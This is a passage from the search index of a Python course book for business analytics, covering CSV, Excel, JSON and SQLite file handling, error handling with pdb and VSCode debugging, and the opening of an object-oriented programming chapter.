    "text": "7.4 Reading and Writing CSV Files\nCSV (Comma-Separated Values) files are commonly used for data storage and exchange in business analytics.\n\n7.4.1 Reading CSV Files\n\nimport csv\n\n# Read CSV file\nwith open('data.csv', 'r') as file:\n    reader = csv.reader(file)\n    for row in reader:\n        print(row)\n\n# Read CSV file into a dictionary\nwith open('data.csv', 'r') as file:\n    reader = csv.DictReader(file)\n    for row in reader:\n        print(row)\n\n['Name', 'Age', 'Department']\n['John Doe', '30', 'Finance']\n['Jane Smith', '25', 'Marketing']\n{'Name': 'John Doe', 'Age': '30', 'Department': 'Finance'}\n{'Name': 'Jane Smith', 'Age': '25', 'Department': 'Marketing'}\n\n\n\n\n7.4.2 Writing CSV Files\n\nimport csv\n\n# Write to a CSV file\nwith open('output.csv', 'w', newline='') as file:\n    writer = csv.writer(file)\n    writer.writerow(['Name', 'Age', 'Department'])\n    writer.writerow(['Alice', '30', 'HR'])\n    writer.writerow(['Bob', '25', 'IT'])\n\n# Write dictionary to CSV file\nwith open('output.csv', 'w', newline='') as file:\n    fieldnames = ['Name', 'Age', 'Department']\n    writer = csv.DictWriter(file, fieldnames=fieldnames)\n    writer.writeheader()\n    writer.writerow({'Name': 'Alice', 'Age': '30', 'Department': 'HR'})\n    writer.writerow({'Name': 'Bob', 'Age': '25', 'Department': 'IT'})",
    "crumbs": [
      "<span class='chapter-number'>6</span>  <span class='chapter-title'>Introduction to Data Handling and File I/O in Python</span>"
    ]
  },
  {
    "objectID": "05_python_data_handling_file_io.html#reading-and-writing-excel-files",
    "href": "05_python_data_handling_file_io.html#reading-and-writing-excel-files",
    "title": "6  Introduction to Data Handling and File I/O in Python",
    "section": "7.5 Reading and Writing Excel Files",
    "text": "7.5 Reading and Writing Excel Files\nExcel files are widely used in business analytics for data storage and manipulation.\n\n7.5.1 Reading Excel Files\n\nimport pandas as pd\n\n# Read Excel file\ndf = pd.read_excel('data.xlsx', sheet_name='Sheet1')\nprint(df)\n\n    Name  Age Department\n0  Alice   30         HR\n1    Bob   25         IT\n\n\n\n\n7.5.2 Writing Excel Files\n\nimport pandas as pd\n\n# Write to Excel file\ndf = pd.DataFrame({\n    'Name': ['Alice', 'Bob'],\n    'Age': [30, 25],\n    'Department': ['HR', 'IT']\n})\n\ndf.to_excel('output.xlsx', index=False)",
    "crumbs": [
      "<span class='chapter-number'>6</span>  <span class='chapter-title'>Introduction to Data Handling and File I/O in Python</span>"
    ]
  },
  {
    "objectID": "05_python_data_handling_file_io.html#handling-json-data",
    "href": "05_python_data_handling_file_io.html#handling-json-data",
    "title": "6  Introduction to Data Handling and File I/O in Python",
    "section": "7.6 Handling JSON Data",
    "text": "7.6 Handling JSON Data\nJSON (JavaScript Object Notation) is a lightweight data interchange format.\n\n7.6.1 Reading JSON Data\n\nimport json\n\n# Read JSON file\nwith open('data.json', 'r') as file:\n    data = json.load(file)\n    print(data)\n\n[{'name': 'John Doe', 'age': 30, 'department': 'Finance'}]\n\n\n\n\n7.6.2 Writing JSON Data\n\nimport json\n\n# Write to JSON file\ndata = {\n    'name': 'Alice',\n    'age': 30,\n    'department': 'HR'\n}\n\nwith open('output.json', 'w') as file:\n    json.dump(data, file, indent=4)",
    "crumbs": [
      "<span class='chapter-number'>6</span>  <span class='chapter-title'>Introduction to Data Handling and File I/O in Python</span>"
    ]
  },
  {
    "objectID": "05_python_data_handling_file_io.html#database-interaction",
    "href": "05_python_data_handling_file_io.html#database-interaction",
    "title": "6  Introduction to Data Handling and File I/O in Python",
    "section": "7.7 Database Interaction",
    "text": "7.7 Database Interaction\nInteracting with databases is essential for managing and querying large datasets in business analytics.\n\n7.7.1 Connecting to a SQLite Database\n\nimport sqlite3\n\n# Connect to database\nconn = sqlite3.connect('example.db')\n\n# Create a cursor object\ncursor = conn.cursor()\n\n# Execute a query\ncursor.execute('CREATE TABLE IF NOT EXISTS employees (id INTEGER PRIMARY KEY, name TEXT, age INTEGER, department TEXT)')\n\n# Insert data\ncursor.execute('INSERT INTO employees (name, age, department) VALUES (?, ?, ?)', ('Alice', 30, 'HR'))\nconn.commit()\n\n# Query data\ncursor.execute('SELECT * FROM employees')\nrows = cursor.fetchall()\nfor row in rows:\n    print(row)\n\n# Close the connection\nconn.close()\n\n(1, 'Alice', 30, 'HR')\n(2, 'Alice', 30, 'HR')\n(3, 'Alice', 30, 'HR')\n(4, 'Alice', 30, 'HR')\n(5, 'Alice', 30, 'HR')\n(6, 'Alice', 30, 'HR')",
    "crumbs": [
      "<span class='chapter-number'>6</span>  <span class='chapter-title'>Introduction to Data Handling and File I/O in Python</span>"
    ]
  },
  {
    "objectID": "05_python_data_handling_file_io.html#working-with-large-data-sets",
    "href": "05_python_data_handling_file_io.html#working-with-large-data-sets",
    "title": "6  Introduction to Data Handling and File I/O in Python",
    "section": "7.8 Working with Large Data Sets",
    "text": "7.8 Working with Large Data Sets\nHandling large datasets efficiently is crucial in business analytics. The pandas library is often used for this purpose.\n\n7.8.1 Reading Large CSV Files in Chunks\nimport pandas as pd\n\n# Read CSV file in chunks\nchunk_size = 1000\nchunks = pd.read_csv('large_data.csv', chunksize=chunk_size)\n\nfor chunk in chunks:\n    process(chunk)  # Replace with actual processing logic",
    "crumbs": [
      "<span class='chapter-number'>6</span>  <span class='chapter-title'>Introduction to Data Handling and File I/O in Python</span>"
    ]
  },
  {
    "objectID": "05_python_data_handling_file_io.html#practical-examples-in-bais",
    "href": "05_python_data_handling_file_io.html#practical-examples-in-bais",
    "title": "6  Introduction to Data Handling and File I/O in Python",
    "section": "7.9 Practical Examples in BAIS",
    "text": "7.9 Practical Examples in BAIS\n\n7.9.1 Sales Data Analysis\nExample: Analyzing Sales Data\n\nimport pandas as pd\n\n# Read sales data from CSV\nsales_data = pd.read_csv('sales_data.csv')\n\n# Calculate total sales\ntotal_sales = sales_data['Sales'].sum()\nprint(f'Total Sales: {total_sales}')\n\n# Group sales by region\nsales_by_region = sales_data.groupby('Region')['Sales'].sum()\nprint(sales_by_region)\n\nTotal Sales: 4837.616651600559\nRegion\nEast     1480.231872\nNorth     748.799547\nSouth     870.603628\nWest     1737.981604\nName: Sales, dtype: float64\n\n\n\n\n7.9.2 Customer Data Management\nExample: Managing Customer Data\n\nimport json\n\n# Read customer data from JSON\nwith open('customers.json', 'r') as file:\n    customers = json.load(file)\n\n# Filter customers by age\nyoung_customers = [customer for customer in customers if customer['age'] &lt; 30]\nprint(young_customers)\n\n# Write filtered data to new JSON file\nwith open('young_customers.json', 'w') as file:\n    json.dump(young_customers, file, indent=4)\n\n[{'name': 'Gregory Gonzalez', 'address': '56015 Anthony Terrace\\nAdkinsborough, MN 09947', 'email': 'samuelreed@gmail.com', 'phone_number': '(349)055-2445x308', 'date_of_birth': '1983-07-28', 'age': 17}, {'name': 'Heather Hansen', 'address': '503 Jenny Garden\\nNorth Stephanie, NV 89247', 'email': 'christinecampbell@sanchez-clark.biz', 'phone_number': '001-281-660-3125', 'date_of_birth': '1991-12-26', 'age': 29}, {'name': 'Kimberly Clarke', 'address': '640 Torres Skyway Apt. 175\\nEmilyside, HI 95695', 'email': 'staceyreynolds@yahoo.com', 'phone_number': '215.990.7578x196', 'date_of_birth': '1979-05-11', 'age': 29}, {'name': 'Daniel Vaughn', 'address': '630 Vargas Tunnel\\nLake Rebeccaside, HI 03481', 'email': 'cliffordrosario@hahn.biz', 'phone_number': '9857234414', 'date_of_birth': '2018-08-09', 'age': -3}, {'name': 'Heather Gonzalez', 'address': '03205 Manuel Stravenue\\nNew Corey, OH 82410', 'email': 'egonzalez@yahoo.com', 'phone_number': '+1-785-146-1714x79345', 'date_of_birth': '1986-01-30', 'age': 25}]",
    "crumbs": [
      "<span class='chapter-number'>6</span>  <span class='chapter-title'>Introduction to Data Handling and File I/O in Python</span>"
    ]
  },
  {
    "objectID": "05_python_data_handling_file_io.html#best-practices-for-data-handling-and-file-io",
    "href": "05_python_data_handling_file_io.html#best-practices-for-data-handling-and-file-io",
    "title": "6  Introduction to Data Handling and File I/O in Python",
    "section": "7.10 Best Practices for Data Handling and File I/O",
    "text": "7.10 Best Practices for Data Handling and File I/O\n\nUse Context Managers: Always use context managers (with statements) for file operations to ensure proper resource management.\nException Handling: Implement exception handling to manage errors during file operations.\nData Validation: Validate data before processing to avoid errors and inconsistencies.\nEfficient Processing: Use efficient data processing techniques, especially for large datasets.\nSecurity: Be mindful of security when handling sensitive data, such as using secure connections for database interactions and avoiding hardcoding sensitive information.",
    "crumbs": [
      "<span class='chapter-number'>6</span>  <span class='chapter-title'>Introduction to Data Handling and File I/O in Python</span>"
    ]
  },
  {
    "objectID": "05_python_data_handling_file_io.html#conclusion-1",
    "href": "05_python_data_handling_file_io.html#conclusion-1",
    "title": "6  Introduction to Data Handling and File I/O in Python",
    "section": "7.11 Conclusion",
    "text": "7.11 Conclusion\nIn this tutorial, we covered the fundamentals of data handling and file I/O in Python, with practical examples related to business analytics and information systems. Mastering these skills will enable you to efficiently manage and analyze data, a crucial aspect of BAIS. Whether you are dealing with text files, CSVs, Excel sheets, JSON data, or databases, Python provides a robust set of tools to handle your data needs.",
    "crumbs": [
      "<span class='chapter-number'>6</span>  <span class='chapter-title'>Introduction to Data Handling and File I/O in Python</span>"
    ]
  },
  {
    "objectID": "06_python_error_handling_debugging.html",
    "href": "06_python_error_handling_debugging.html",
    "title": "7  Introduction to Error Handling and Debugging in Python",
    "section": "",
    "text": "7.0.1 Error Handling in Python\nError handling in Python is managed using try-except blocks, which allow you to catch and handle exceptions gracefully, preventing your program from crashing unexpectedly.",
    "crumbs": [
      "<span class='chapter-number'>7</span>  <span class='chapter-title'>Introduction to Error Handling and Debugging in Python</span>"
    ]
  },
  {
    "objectID": "06_python_error_handling_debugging.html#table-of-contents",
    "href": "06_python_error_handling_debugging.html#table-of-contents",
    "title": "7  Introduction to Error Handling and Debugging in Python",
    "section": "8.1 Table of Contents",
    "text": "8.1 Table of Contents\n\nIntroduction to Error Handling\ntry and except Blocks\nHandling Multiple Exceptions\nelse Block\nfinally Block\nRaising Exceptions\nCustom Exceptions\nIntroduction to Debugging\nUsing the pdb Module\nPractical Examples\n\nExample 1: File Operations\nExample 2: Network Operations\n\nBest Practices for Error Handling and Debugging\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>7</span>  <span class='chapter-title'>Introduction to Error Handling and Debugging in Python</span>"
    ]
  },
  {
    "objectID": "06_python_error_handling_debugging.html#introduction-to-error-handling",
    "href": "06_python_error_handling_debugging.html#introduction-to-error-handling",
    "title": "7  Introduction to Error Handling and Debugging in Python",
    "section": "8.2 Introduction to Error Handling",
    "text": "8.2 Introduction to Error Handling\nError handling in Python is managed using the try, except, else, and finally blocks. These constructs allow you to catch and handle exceptions gracefully, ensuring that your program can recover from errors or exit cleanly.",
    "crumbs": [
      "<span class='chapter-number'>7</span>  <span class='chapter-title'>Introduction to Error Handling and Debugging in Python</span>"
    ]
  },
  {
    "objectID": "06_python_error_handling_debugging.html#try-and-except-blocks",
    "href": "06_python_error_handling_debugging.html#try-and-except-blocks",
    "title": "7  Introduction to Error Handling and Debugging in Python",
    "section": "8.3 try and except Blocks",
    "text": "8.3 try and except Blocks\nThe try block lets you test a block of code for errors. The except block lets you handle the error.\n\n8.3.1 Basic Syntax\ntry:\n    # Code that may raise an exception\n    result = 10 / 0\nexcept ZeroDivisionError:\n    # Code to handle the exception\n    print(\"You cannot divide by zero!\")\n\n\n8.3.2 Example\ntry:\n    number = int(input(\"Enter a number: \"))\n    result = 100 / number\n    print(f\"Result: {result}\")\nexcept ZeroDivisionError:\n    print(\"You cannot divide by zero!\")\nexcept ValueError:\n    print(\"Invalid input. Please enter a numeric value.\")",
    "crumbs": [
      "<span class='chapter-number'>7</span>  <span class='chapter-title'>Introduction to Error Handling and Debugging in Python</span>"
    ]
  },
  {
    "objectID": "06_python_error_handling_debugging.html#handling-multiple-exceptions",
    "href": "06_python_error_handling_debugging.html#handling-multiple-exceptions",
    "title": "7  Introduction to Error Handling and Debugging in Python",
    "section": "8.4 Handling Multiple Exceptions",
    "text": "8.4 Handling Multiple Exceptions\nYou can handle multiple exceptions by specifying multiple except blocks.\n\n8.4.1 Example\ntry:\n    file = open(\"data.txt\", \"r\")\n    number = int(file.readline())\n    result = 100 / number\nexcept FileNotFoundError:\n    print(\"The file was not found.\")\nexcept ZeroDivisionError:\n    print(\"You cannot divide by zero!\")\nexcept ValueError:\n    print(\"Invalid number in the file.\")",
    "crumbs": [
      "<span class='chapter-number'>7</span>  <span class='chapter-title'>Introduction to Error Handling and Debugging in Python</span>"
    ]
  },
  {
    "objectID": "06_python_error_handling_debugging.html#else-block",
    "href": "06_python_error_handling_debugging.html#else-block",
    "title": "7  Introduction to Error Handling and Debugging in Python",
    "section": "8.5 else Block",
    "text": "8.5 else Block\nThe else block executes if no exceptions were raised in the try block.\n\n8.5.1 Example\ntry:\n    number = int(input(\"Enter a number: \"))\n    result = 100 / number\nexcept ZeroDivisionError:\n    print(\"You cannot divide by zero!\")\nexcept ValueError:\n    print(\"Invalid input. Please enter a numeric value.\")\nelse:\n    print(f\"Result: {result}\")",
    "crumbs": [
      "<span class='chapter-number'>7</span>  <span class='chapter-title'>Introduction to Error Handling and Debugging in Python</span>"
    ]
  },
  {
    "objectID": "06_python_error_handling_debugging.html#finally-block",
    "href": "06_python_error_handling_debugging.html#finally-block",
    "title": "7  Introduction to Error Handling and Debugging in Python",
    "section": "8.6 finally Block",
    "text": "8.6 finally Block\nThe finally block lets you execute code, regardless of whether an exception was raised or not.\n\n8.6.1 Example\ntry:\n    number = int(input(\"Enter a number: \"))\n    result = 100 / number\nexcept ZeroDivisionError:\n    print(\"You cannot divide by zero!\")\nexcept ValueError:\n    print(\"Invalid input. Please enter a numeric value.\")\nelse:\n    print(f\"Result: {result}\")\nfinally:\n    print(\"This block is always executed.\")",
    "crumbs": [
      "<span class='chapter-number'>7</span>  <span class='chapter-title'>Introduction to Error Handling and Debugging in Python</span>"
    ]
  },
  {
    "objectID": "06_python_error_handling_debugging.html#raising-exceptions",
    "href": "06_python_error_handling_debugging.html#raising-exceptions",
    "title": "7  Introduction to Error Handling and Debugging in Python",
    "section": "8.7 Raising Exceptions",
    "text": "8.7 Raising Exceptions\nYou can use the raise statement to generate an exception if a condition occurs.\n\n8.7.1 Example\ndef check_positive(number):\n    if number &lt; 0:\n        raise ValueError(\"The number must be positive\")\n    return number\n\ntry:\n    num = check_positive(-10)\nexcept ValueError as e:\n    print(e)",
    "crumbs": [
      "<span class='chapter-number'>7</span>  <span class='chapter-title'>Introduction to Error Handling and Debugging in Python</span>"
    ]
  },
  {
    "objectID": "06_python_error_handling_debugging.html#custom-exceptions",
    "href": "06_python_error_handling_debugging.html#custom-exceptions",
    "title": "7  Introduction to Error Handling and Debugging in Python",
    "section": "8.8 Custom Exceptions",
    "text": "8.8 Custom Exceptions\nYou can define custom exceptions by creating a new class that inherits from the built-in Exception class.\n\n8.8.1 Example\nclass NegativeNumberError(Exception):\n    pass\n\ndef check_positive(number):\n    if number &lt; 0:\n        raise NegativeNumberError(\"The number must be positive\")\n    return number\n\ntry:\n    num = check_positive(-10)\nexcept NegativeNumberError as e:\n    print(e)",
    "crumbs": [
      "<span class='chapter-number'>7</span>  <span class='chapter-title'>Introduction to Error Handling and Debugging in Python</span>"
    ]
  },
  {
    "objectID": "06_python_error_handling_debugging.html#introduction-to-debugging",
    "href": "06_python_error_handling_debugging.html#introduction-to-debugging",
    "title": "7  Introduction to Error Handling and Debugging in Python",
    "section": "8.9 Introduction to Debugging",
    "text": "8.9 Introduction to Debugging\nDebugging is the process of identifying and removing errors from your code. Python provides several tools for debugging, with pdb (Python Debugger) being one of the most powerful and commonly used.",
    "crumbs": [
      "<span class='chapter-number'>7</span>  <span class='chapter-title'>Introduction to Error Handling and Debugging in Python</span>"
    ]
  },
  {
    "objectID": "06_python_error_handling_debugging.html#using-the-pdb-module",
    "href": "06_python_error_handling_debugging.html#using-the-pdb-module",
    "title": "7  Introduction to Error Handling and Debugging in Python",
    "section": "8.10 Using the pdb Module",
    "text": "8.10 Using the pdb Module\nThe pdb module allows you to set breakpoints, step through code, inspect variables, and evaluate expressions at runtime.\n\n8.10.1 Basic Usage\n\nImporting pdb: You need to import the pdb module.\nSetting Breakpoints: Use pdb.set_trace() to set a breakpoint.\n\n\n\n8.10.2 Example\nimport pdb\n\ndef divide(a, b):\n    pdb.set_trace()  # Set a breakpoint\n    return a / b\n\ntry:\n    result = divide(10, 0)\nexcept ZeroDivisionError as e:\n    print(e)\n\n\n8.10.3 Common pdb Commands\n\nn (next): Continue to the next line in the current function.\ns (step): Step into the function.\nc (continue): Continue execution until the next breakpoint.\nq (quit): Quit the debugger.\np (print): Print the value of an expression.",
    "crumbs": [
      "<span class='chapter-number'>7</span>  <span class='chapter-title'>Introduction to Error Handling and Debugging in Python</span>"
    ]
  },
  {
    "objectID": "06_python_error_handling_debugging.html#practical-examples",
    "href": "06_python_error_handling_debugging.html#practical-examples",
    "title": "7  Introduction to Error Handling and Debugging in Python",
    "section": "8.11 Practical Examples",
    "text": "8.11 Practical Examples\n\n8.11.1 Example 1: File Operations\nimport pdb\n\ndef read_file(file_path):\n    pdb.set_trace()\n    try:\n        with open(file_path, 'r') as file:\n            data = file.read()\n            return data\n    except FileNotFoundError:\n        print(\"File not found.\")\n    except IOError:\n        print(\"Error reading file.\")\n\nfile_content = read_file(\"non_existent_file.txt\")\nprint(file_content)\n\n\n8.11.2 Example 2: Network Operations\nimport requests\nimport pdb\n\ndef fetch_data(url):\n    pdb.set_trace()\n    try:\n        response = requests.get(url)\n        response.raise_for_status()\n        return response.json()\n    except requests.exceptions.HTTPError as errh:\n        print(\"Http Error:\", errh)\n    except requests.exceptions.ConnectionError as errc:\n        print(\"Error Connecting:\", errc)\n    except requests.exceptions.Timeout as errt:\n        print(\"Timeout Error:\", errt)\n    except requests.exceptions.RequestException as err:\n        print(\"Something went wrong:\", err)\n\ndata = fetch_data(\"https://jsonplaceholder.typicode.com/posts/1\")\nprint(data)",
    "crumbs": [
      "<span class='chapter-number'>7</span>  <span class='chapter-title'>Introduction to Error Handling and Debugging in Python</span>"
    ]
  },
  {
    "objectID": "06_python_error_handling_debugging.html#best-practices-for-error-handling-and-debugging",
    "href": "06_python_error_handling_debugging.html#best-practices-for-error-handling-and-debugging",
    "title": "7  Introduction to Error Handling and Debugging in Python",
    "section": "8.12 Best Practices for Error Handling and Debugging",
    "text": "8.12 Best Practices for Error Handling and Debugging\n\nBe Specific: Catch specific exceptions rather than a general Exception.\nLog Errors: Use logging to record errors for later analysis.\nUse finally Wisely: Ensure cleanup actions are always executed.\nAvoid Silent Failures: Don’t suppress exceptions without handling them.\nUse Debuggers: Utilize debuggers like pdb to inspect and trace code execution.\nValidate Inputs: Always validate inputs to prevent unexpected errors.\nTest Thoroughly: Write tests to cover different scenarios and edge cases.",
    "crumbs": [
      "<span class='chapter-number'>7</span>  <span class='chapter-title'>Introduction to Error Handling and Debugging in Python</span>"
    ]
  },
  {
    "objectID": "06_python_error_handling_debugging.html#conclusion-1",
    "href": "06_python_error_handling_debugging.html#conclusion-1",
    "title": "7  Introduction to Error Handling and Debugging in Python",
    "section": "8.13 Conclusion",
    "text": "8.13 Conclusion\nError handling and debugging are essential skills for writing robust Python code. By using try, except, else, and finally blocks effectively, and leveraging the pdb module for debugging, you can create more reliable and maintainable applications. Remember to follow best practices to enhance the quality and resilience of your code.",
    "crumbs": [
      "<span class='chapter-number'>7</span>  <span class='chapter-title'>Introduction to Error Handling and Debugging in Python</span>"
    ]
  },
  {
    "objectID": "06_python_error_handling_debugging.html#table-of-contents-1",
    "href": "06_python_error_handling_debugging.html#table-of-contents-1",
    "title": "7  Introduction to Error Handling and Debugging in Python",
    "section": "9.1 Table of Contents",
    "text": "9.1 Table of Contents\n\nSetting Up VSCode for Python Development\nCreating a Python Project\nConfiguring the Debugger\nBasic Debugging Features\nAdvanced Debugging Techniques\nPractical Examples\nBest Practices for Debugging in VSCode\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>7</span>  <span class='chapter-title'>Introduction to Error Handling and Debugging in Python</span>"
    ]
  },
  {
    "objectID": "06_python_error_handling_debugging.html#setting-up-vscode-for-python-development",
    "href": "06_python_error_handling_debugging.html#setting-up-vscode-for-python-development",
    "title": "7  Introduction to Error Handling and Debugging in Python",
    "section": "9.2 Setting Up VSCode for Python Development",
    "text": "9.2 Setting Up VSCode for Python Development\nBefore you start debugging Python code in VSCode, you need to set up your development environment.\n\n9.2.1 Install VSCode\nDownload and install VSCode from the official website.\n\n\n9.2.2 Install Python\nEnsure you have Python installed on your machine. You can download it from the official Python website.\n\n\n9.2.3 Install Python Extension for VSCode\n\nOpen VSCode.\nGo to the Extensions view by clicking the square icon in the sidebar or pressing Ctrl+Shift+X.\nSearch for “Python” and install the extension provided by Microsoft.\n\n\n\n\nInstall Python Extension\n\n\n\n\n9.2.4 Verify Installation\n\nOpen a new terminal in VSCode (Ctrl+ `).\nType python --version to verify that Python is installed correctly.",
    "crumbs": [
      "<span class='chapter-number'>7</span>  <span class='chapter-title'>Introduction to Error Handling and Debugging in Python</span>"
    ]
  },
  {
    "objectID": "06_python_error_handling_debugging.html#creating-a-python-project",
    "href": "06_python_error_handling_debugging.html#creating-a-python-project",
    "title": "7  Introduction to Error Handling and Debugging in Python",
    "section": "9.3 Creating a Python Project",
    "text": "9.3 Creating a Python Project\nCreate a new Python project or open an existing one.\n\nOpen VSCode.\nClick on “File” &gt; “Open Folder…” and select your project directory.\nCreate a new Python file by clicking “File” &gt; “New File” and save it with a .py extension (e.g., app.py).\n\n\n9.3.1 Example Code\nAdd some sample Python code to app.py:\ndef divide(a, b):\n    return a / b\n\ndef main():\n    try:\n        result = divide(10, 0)\n        print(f\"Result: {result}\")\n    except ZeroDivisionError as e:\n        print(\"Error:\", e)\n\nif __name__ == \"__main__\":\n    main()",
    "crumbs": [
      "<span class='chapter-number'>7</span>  <span class='chapter-title'>Introduction to Error Handling and Debugging in Python</span>"
    ]
  },
  {
    "objectID": "06_python_error_handling_debugging.html#configuring-the-debugger",
    "href": "06_python_error_handling_debugging.html#configuring-the-debugger",
    "title": "7  Introduction to Error Handling and Debugging in Python",
    "section": "9.4 Configuring the Debugger",
    "text": "9.4 Configuring the Debugger\nConfigure the debugger to run your Python code.\n\nClick on the Debug icon in the sidebar or press Ctrl+Shift+D.\nClick on “create a launch.json file” to customize the debugger.\n\n\n9.4.1 Sample launch.json\nVSCode will create a .vscode folder in your project directory with a launch.json file. This file contains configurations for debugging.\n{\n    \"version\": \"0.2.0\",\n    \"configurations\": [\n        {\n            \"name\": \"Python: Current File\",\n            \"type\": \"python\",\n            \"request\": \"launch\",\n            \"program\": \"${file}\",\n            \"console\": \"integratedTerminal\"\n        }\n    ]\n}",
    "crumbs": [
      "<span class='chapter-number'>7</span>  <span class='chapter-title'>Introduction to Error Handling and Debugging in Python</span>"
    ]
  },
  {
    "objectID": "06_python_error_handling_debugging.html#basic-debugging-features",
    "href": "06_python_error_handling_debugging.html#basic-debugging-features",
    "title": "7  Introduction to Error Handling and Debugging in Python",
    "section": "9.5 Basic Debugging Features",
    "text": "9.5 Basic Debugging Features\n\n9.5.1 Setting Breakpoints\n\nClick in the gutter (left margin) next to the line numbers to set a breakpoint.\nA red dot will appear, indicating the breakpoint.\n\n\n\n9.5.2 Starting the Debugger\n\nPress F5 to start debugging.\nThe debugger will stop at the first breakpoint.\n\n\n\n9.5.3 Debugging Controls\n\nContinue (F5): Resume program execution until the next breakpoint.\nStep Over (F10): Execute the current line of code and move to the next line.\nStep Into (F11): Step into the function call on the current line.\nStep Out (Shift+F11): Step out of the current function and return to the caller.\nRestart (Ctrl+Shift+F5): Restart the debugging session.\nStop (Shift+F5): Stop the debugging session.\n\n\n\n9.5.4 Inspecting Variables\n\nHover over a variable to see its value.\nUse the “Variables” pane to inspect local and global variables.\n\n\n\n9.5.5 Watch Expressions\n\nAdd expressions to the “Watch” pane to monitor their values as you step through the code.\n\n\n\n9.5.6 Call Stack\n\nThe “Call Stack” pane shows the stack of function calls leading to the current breakpoint.",
    "crumbs": [
      "<span class='chapter-number'>7</span>  <span class='chapter-title'>Introduction to Error Handling and Debugging in Python</span>"
    ]
  },
  {
    "objectID": "06_python_error_handling_debugging.html#advanced-debugging-techniques",
    "href": "06_python_error_handling_debugging.html#advanced-debugging-techniques",
    "title": "7  Introduction to Error Handling and Debugging in Python",
    "section": "9.6 Advanced Debugging Techniques",
    "text": "9.6 Advanced Debugging Techniques\n\n9.6.1 Conditional Breakpoints\n\nRight-click on a breakpoint and select “Edit Breakpoint”.\nAdd an expression that must be true for the breakpoint to trigger.\n\n\n\n9.6.2 Log Points\n\nRight-click on a line number and select “Add Logpoint”.\nEnter a message to log when the line is executed.\n\n\n\n9.6.3 Exception Breakpoints\n\nClick on the “Breakpoints” pane and add a new exception breakpoint.\nSelect the types of exceptions to break on (e.g., all exceptions or uncaught exceptions).\n\n\n\n9.6.4 Remote Debugging\n\nConfigure VSCode to attach to a remote Python process for debugging.\nUpdate launch.json with the appropriate “port” and “host” settings.\n\n\n\n9.6.5 Debugging Tests\n\nUse the Python extension’s built-in support for debugging unit tests.\nClick on the “Test” icon in the sidebar and configure your test framework.",
    "crumbs": [
      "<span class='chapter-number'>7</span>  <span class='chapter-title'>Introduction to Error Handling and Debugging in Python</span>"
    ]
  },
  {
    "objectID": "06_python_error_handling_debugging.html#practical-examples-1",
    "href": "06_python_error_handling_debugging.html#practical-examples-1",
    "title": "7  Introduction to Error Handling and Debugging in Python",
    "section": "9.7 Practical Examples",
    "text": "9.7 Practical Examples\n\n9.7.1 Example 1: Debugging a Web Scraper\nCreate a simple web scraper using requests and BeautifulSoup.\nimport requests\nfrom bs4 import BeautifulSoup\n\ndef fetch_data(url):\n    response = requests.get(url)\n    response.raise_for_status()\n    return response.text\n\ndef parse_data(html):\n    soup = BeautifulSoup(html, 'html.parser')\n    title = soup.find('title').text\n    return title\n\ndef main():\n    try:\n        url = 'https://example.com'\n        html = fetch_data(url)\n        title = parse_data(html)\n        print(f\"Page Title: {title}\")\n    except requests.exceptions.RequestException as e:\n        print(\"HTTP Error:\", e)\n\nif __name__ == \"__main__\":\n    main()\nSet breakpoints and use the debugger to inspect the html and title variables.\n\n\n9.7.2 Example 2: Debugging a Data Analysis Script\nCreate a data analysis script using pandas.\nimport pandas as pd\n\ndef load_data(file_path):\n    data = pd.read_csv(file_path)\n    return data\n\ndef analyze_data(data):\n    summary = data.describe()\n    return summary\n\ndef main():\n    try:\n        file_path = 'data.csv'\n        data = load_data(file_path)\n        summary = analyze_data(data)\n        print(summary)\n    except FileNotFoundError as e:\n        print(\"File not found:\", e)\n\nif __name__ == \"__main__\":\n    main()\nSet breakpoints and use the debugger to inspect the data and summary variables.",
    "crumbs": [
      "<span class='chapter-number'>7</span>  <span class='chapter-title'>Introduction to Error Handling and Debugging in Python</span>"
    ]
  },
  {
    "objectID": "06_python_error_handling_debugging.html#best-practices-for-debugging-in-vscode",
    "href": "06_python_error_handling_debugging.html#best-practices-for-debugging-in-vscode",
    "title": "7  Introduction to Error Handling and Debugging in Python",
    "section": "9.8 Best Practices for Debugging in VSCode",
    "text": "9.8 Best Practices for Debugging in VSCode\n\nUse Meaningful Breakpoints: Set breakpoints at critical points in your code to avoid stepping through unnecessary lines.\nLeverage Conditional Breakpoints: Use conditions to trigger breakpoints only when specific criteria are met.\nUtilize Watch Expressions: Monitor the values of variables and expressions to understand their changes over time.\nInspect the Call Stack: Use the call stack to trace the sequence of function calls leading to the current state.\nLog Important Information: Use log points to output key information without modifying your code.",
    "crumbs": [
      "<span class='chapter-number'>7</span>  <span class='chapter-title'>Introduction to Error Handling and Debugging in Python</span>"
    ]
  },
  {
    "objectID": "06_python_error_handling_debugging.html#conclusion-2",
    "href": "06_python_error_handling_debugging.html#conclusion-2",
    "title": "7  Introduction to Error Handling and Debugging in Python",
    "section": "9.9 Conclusion",
    "text": "9.9 Conclusion\nVSCode provides a powerful and user-friendly environment for debugging Python code. By leveraging its debugging features, you can quickly identify and fix issues, making your development process more efficient and enjoyable. Follow best practices and use advanced techniques to get the most out of your debugging sessions. Happy coding!",
    "crumbs": [
      "<span class='chapter-number'>7</span>  <span class='chapter-title'>Introduction to Error Handling and Debugging in Python</span>"
    ]
  },
  {
    "objectID": "07_python_oop.html",
    "href": "07_python_oop.html",
    "title": "8  Introduction to Object-Oriented Programming with Python",
    "section": "",
    "text": "8.0.1 Basics of Classes and Objects",
    "crumbs": [
      "<span class='chapter-number'>8</span>  <span class='chapter-title'>Introduction to Object-Oriented Programming with Python</span>"
    ]
  },
  {
    "objectID": "07_python_oop.html#table-of-contents",
    "href": "07_python_oop.html#table-of-contents",
    "title": "8  Introduction to Object-Oriented Programming with Python",
    "section": "9.1 Table of Contents",
    "text": "9.1 Table of Contents\n\nIntroduction to OOP\nDefining Classes and Creating Objects\nAttributes and Methods\nEncapsulation\nInheritance\nPolymorphism\nUsing OOP in Business Analytics\nPractical Examples\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>8</span>  <span class='chapter-title'>Introduction to Object-Oriented Programming with Python</span>"
    ]
  },
  {
    "objectID": "07_python_oop.html#introduction-to-oop",
    "href": "07_python_oop.html#introduction-to-oop",
    "title": "8  Introduction to Object-Oriented Programming with Python",
    "section": "9.2 Introduction to OOP",
